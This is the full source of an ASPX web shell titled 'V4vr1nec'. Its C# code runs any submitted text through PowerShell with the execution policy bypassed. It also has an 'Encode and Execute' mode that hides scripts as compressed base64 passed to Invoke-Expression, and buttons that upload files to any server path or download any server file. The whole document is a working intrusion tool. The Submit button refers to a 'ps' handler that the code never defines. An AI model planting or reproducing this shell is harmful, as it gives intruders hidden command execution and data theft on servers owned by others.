<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.IO.Compression" %>

<script Language="c#" runat="server">
   protected override void OnInit(EventArgs e)
    {
        output.Text = @"Welcome to V4vr1nec
        Webshell with PowerShell (PS>)
        Commands:
        [help] For more details.
        [clear] To clear the screen.";
    }
    string do_ps(string arg)
    {
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "powershell.exe";
        psi.Arguments = "-noninteractive " + "-executionpolicy bypass " + arg;
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        Process p = Process.Start(psi);
        StreamReader stmrdr = p.StandardOutput;
        string s = stmrdr.ReadToEnd();
        stmrdr.Close();
        return s;
    }


    void execcommand(string cmd)
    {
        output.Text += "PS> " + "\n" + do_ps(cmd);
        console.Text = string.Empty;
        console.Focus();
    }

    void base64encode(object sender, System.EventArgs e)
    {
        string contents = console.Text;

        // Compress Script

        MemoryStream ms = new MemoryStream();

        DeflateStream cs = new DeflateStream(ms, CompressionMode.Compress);

        StreamWriter sw = new StreamWriter(cs, ASCIIEncoding.ASCII);

        sw.WriteLine(contents);

        sw.Close();

        string code = Convert.ToBase64String(ms.ToArray());

        string command = "Invoke-Expression $(New-Object IO.StreamReader (" +

            "$(New-Object IO.Compression.DeflateStream (" +

            "$(New-Object IO.MemoryStream (," +

            "$([Convert]::FromBase64String('" + code + "')))), " +

            "[IO.Compression.CompressionMode]::Decompress))," +

            " [Text.Encoding]::ASCII)).ReadToEnd();";

        execcommand(command);


    }
   protected void uploadbutton_Click(object sender, EventArgs e)
    {
        if (upload.HasFile) {
            try {
                string filename = Path.GetFileName(upload.FileName);
                upload.SaveAs(console.Text + "\\" + filename);
                output.Text = "File uploaded to: " + console.Text + "\\" + filename;
            }
            catch (Exception ex)
            {
                output.Text = "Upload status: The file could not be uploaded. The following error occured: " + ex.Message;
            }
        }
    }
   
   protected void downloadbutton_Click(object sender, EventArgs e)
    {
        try {
            Response.ContentType = "application/octet-stream";

            Response.AppendHeader("Content-Disposition", "attachment; filename=" + console.Text);

            Response.TransmitFile(console.Text);

            Response.End();

        }


        catch (Exception ex)
        {
            output.Text = ex.ToString();
        }
    }


</script>
<HTML>

<HEAD>
    <title>V4vr1nec - Aspx Web Shell (PS>)</title>
</HEAD>

<body bgcolor="#f2f2f2">
    <center>
    <div>
        <form id="Form1" method="post" runat="server" style="background-color: #f2f2f2">
            <div style="text-align:center; resize:vertical">
                <asp:TextBox ID="output" runat="server" TextMode="MultiLine" BackColor="#012456" ForeColor="White" style="height: 526px; width: 891px;" ReadOnly="True"></asp:TextBox>
                <asp:TextBox ID="console" runat="server" BackColor="#012456" ForeColor="Yellow" Width="891px" TextMode="MultiLine" Rows="1" onkeydown="if(event.keyCode == 13) document.getElementById('cmd').click()" Height="23px" AutoCompleteType="None"></asp:TextBox>
            </div>
            <div style="width: 1100px; text-align:center">
                <asp:Button ID="cmd" runat="server" Text="Submit" OnClick="ps" />
                <asp:FileUpload ID="upload" runat="server" />
                <asp:Button ID="uploadbutton" runat="server" Text="Upload the File" OnClick="uploadbutton_Click" />
                <asp:Button ID="encode" runat="server" Text="Encode and Execute" OnClick="base64encode" />
                <asp:Button ID="downloadbutton" runat="server" Text="Download" OnClick="downloadbutton_Click" />
            </div>
        </form>
    </div>
</center>
</body>

</HTML>
